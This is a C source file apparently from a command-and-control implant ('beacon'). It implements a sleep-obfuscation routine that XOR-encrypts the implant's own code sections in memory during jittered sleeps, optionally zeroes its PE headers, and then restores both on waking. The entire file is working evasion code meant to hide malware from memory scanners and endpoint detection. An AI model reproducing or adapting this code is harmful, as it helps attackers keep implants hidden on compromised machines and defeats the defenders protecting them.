#include "../include/sleep_obf.h"
#include "../include/sleep_utils.h"
#include "../include/utils.h"
#include "../include/pandragon_runtime.h"

#undef noinline
#define OBF_SECTION __attribute__((section(".obf")))

#define MAX_MORPHEUS_SECTIONS  16

static void OBF_SECTION xorMemory(uint8_t* data, SIZE_T len, const uint8_t* key, SIZE_T keyLen) {
    for (SIZE_T i = 0; i < len; i++)
        data[i] ^= key[i % keyLen];
}

__attribute__((noinline))
bool OBF_SECTION SleepObf_Morpheus(functionTable* nt, const BeaconConfig* config, uint32_t sleep_ms, uint8_t jitter_pct) {
    if (!config) return false;

    HANDLE hProcess = NtCurrentProcess();
    uint32_t sleepTime = ApplySleepJitter(sleep_ms, jitter_pct);
    if (sleepTime == 0) sleepTime = 1;

    uint8_t* xorKey = (uint8_t*)__malloc(SLEEP_XOR_KEY_LENGTH);
    if (!xorKey) return false;
    deriveXorKey(xorKey, config->crypto_key, config->beacon_id);

    PPEB peb = getCurrentPEB();
    PVOID imageBase = ((PLDR_DATA_TABLE_ENTRY)peb->LoaderData->InLoadOrderModuleList.Flink)->DllBase;

    SleepSectionInfo* sections = (SleepSectionInfo*)__malloc(sizeof(SleepSectionInfo) * MAX_MORPHEUS_SECTIONS);
    if (!sections) {
        __free(xorKey);
        return false;
    }
    int sectionCount = enumerateCodeSections(imageBase, sections, MAX_MORPHEUS_SECTIONS);
    if (sectionCount == 0) {
        __free(sections);
        __free(xorKey);
        return false;
    }

    uint8_t* peHeaderBackup = nullptr;
    bool wipedPeHeaders = false;

    for (int i = 0; i < sectionCount; i++) {
        PVOID base = sections[i].base;
        SIZE_T size = sections[i].size;
        ULONG oldProtect = 0;
        nt->NtProtectVirtualMemory(hProcess, &base, &size, PAGE_READWRITE, &oldProtect);
        sections[i].oldProtect = oldProtect;
        xorMemory((uint8_t*)sections[i].base, sections[i].size, xorKey, SLEEP_XOR_KEY_LENGTH);
        base = sections[i].base;
        size = sections[i].size;
        nt->NtProtectVirtualMemory(hProcess, &base, &size, PAGE_EXECUTE_READ, &oldProtect);
    }

    if (config->options.sleep_wipe_pe_headers && imageBase) {
        peHeaderBackup = (uint8_t*)__malloc(0x1000);
        if (peHeaderBackup) {
            PVOID hdrBase = imageBase;
            SIZE_T hdrSize = 0x1000;
            ULONG oldProtect = 0;
            volatile uint8_t* p = (volatile uint8_t*)imageBase;
            for (SIZE_T j = 0; j < 0x1000; j++) peHeaderBackup[j] = p[j];
            nt->NtProtectVirtualMemory(hProcess, &hdrBase, &hdrSize, PAGE_READWRITE, &oldProtect);
            for (SIZE_T j = 0; j < 0x1000; j++) p[j] = 0;
            hdrBase = imageBase;
            nt->NtProtectVirtualMemory(hProcess, &hdrBase, &hdrSize, oldProtect, &oldProtect);
            wipedPeHeaders = true;
        }
    }

    volatile LONG wakeFlag = 0;
    LONG expected = 0;
    LARGE_INTEGER timeout;
    timeout.QuadPart = -(LONGLONG)sleepTime * 10000;

    nt->RtlWaitOnAddress((PVOID)&wakeFlag, &expected, sizeof(wakeFlag), &timeout);

    for (int i = 0; i < sectionCount; i++) {
        PVOID base = sections[i].base;
        SIZE_T size = sections[i].size;
        ULONG oldProtect = 0;
        nt->NtProtectVirtualMemory(hProcess, &base, &size, PAGE_READWRITE, &oldProtect);
        xorMemory((uint8_t*)sections[i].base, sections[i].size, xorKey, SLEEP_XOR_KEY_LENGTH);
        base = sections[i].base;
        size = sections[i].size;
        nt->NtProtectVirtualMemory(hProcess, &base, &size, PAGE_EXECUTE_READ, &oldProtect);
    }

    if (wipedPeHeaders && peHeaderBackup && peHeaderBackup[0] != 0) {
        PVOID hdrBase = imageBase;
        SIZE_T hdrSize = 0x1000;
        ULONG oldProtect = 0;
        nt->NtProtectVirtualMemory(hProcess, &hdrBase, &hdrSize, PAGE_READWRITE, &oldProtect);
        volatile uint8_t* dst = (volatile uint8_t*)imageBase;
        for (SIZE_T j = 0; j < 0x1000; j++) dst[j] = peHeaderBackup[j];
        hdrBase = imageBase;
        nt->NtProtectVirtualMemory(hProcess, &hdrBase, &hdrSize, oldProtect, &oldProtect);
    }

    if (peHeaderBackup) __free(peHeaderBackup);
    __free(sections);
    __free(xorKey);
    return true;
}
